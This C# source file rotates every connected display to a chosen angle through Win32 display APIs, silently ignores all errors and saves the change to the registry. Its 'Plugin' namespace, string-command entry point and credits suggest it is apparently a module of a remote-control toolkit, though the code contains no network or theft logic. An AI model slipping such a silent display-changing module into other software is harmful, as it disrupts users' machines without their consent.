using System;
using System.Runtime.InteropServices;
using static Plugin.Imports;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : inferno from LimerBoy : https://github.com/arsium/Inferno ||
*/

namespace Plugin
{
    internal class ScreenRotation
    {
		private static bool RotateScreen(uint DisplayNumber, Orientations Orientation)
		{
			if (DisplayNumber == 0)
			{
				throw new ArgumentOutOfRangeException("DisplayNumber", DisplayNumber, "First display is 1.");
			}

			bool result = false;
			DISPLAY_DEVICE d = new DISPLAY_DEVICE();
			DEVMODE dm = new DEVMODE();
			d.cb = Marshal.SizeOf(d);

			if (!Imports.EnumDisplayDevices(null, DisplayNumber - 1, ref d, 0))
			{
				throw new ArgumentOutOfRangeException("DisplayNumber", DisplayNumber, "Number is greater than connected displays.");
			}

			if (0 != Imports.EnumDisplaySettings(d.DeviceName, Imports.ENUM_CURRENT_SETTINGS, ref dm))
			{
				if ((dm.dmDisplayOrientation + Convert.ToInt32(Orientation)) % 2 == 1) // Need to swap height and width?
				{
					int temp = dm.dmPelsHeight;
					dm.dmPelsHeight = dm.dmPelsWidth;
					dm.dmPelsWidth = temp;
				}

				switch (Orientation)
				{
					case Orientations.DEGREES_CW_90:
						dm.dmDisplayOrientation = Imports.DMDO_270;
						break;
					case Orientations.DEGREES_CW_180:
						dm.dmDisplayOrientation = Imports.DMDO_180;
						break;
					case Orientations.DEGREES_CW_270:
						dm.dmDisplayOrientation = Imports.DMDO_90;
						break;
					case Orientations.DEGREES_CW_0:
						dm.dmDisplayOrientation = Imports.DMDO_DEFAULT;
						break;
					default:
						break;
				}

				DISP_CHANGE ret = Imports.ChangeDisplaySettingsEx(d.DeviceName, ref dm, IntPtr.Zero, DisplaySettingsFlags.CDS_UPDATEREGISTRY, IntPtr.Zero);

				result = (int)ret == 0;
			}
			return result;
		}

		internal static void Rotate(string degrees)
		{
			try
			{
				uint i = 0;
				i += 1;

				while (i <= 64)
				{
					switch (degrees)
					{
						case "0":
							RotateScreen(i, Orientations.DEGREES_CW_0);
							break;
						case "90":
							RotateScreen(i, Orientations.DEGREES_CW_90);
							break;
						case "180":
							RotateScreen(i, Orientations.DEGREES_CW_180);
							break;
						case "270":
							RotateScreen(i, Orientations.DEGREES_CW_270);
							break;
						default:

							break;
					}
					i += 1;
				}
			}
			catch {}
		}
	}
}
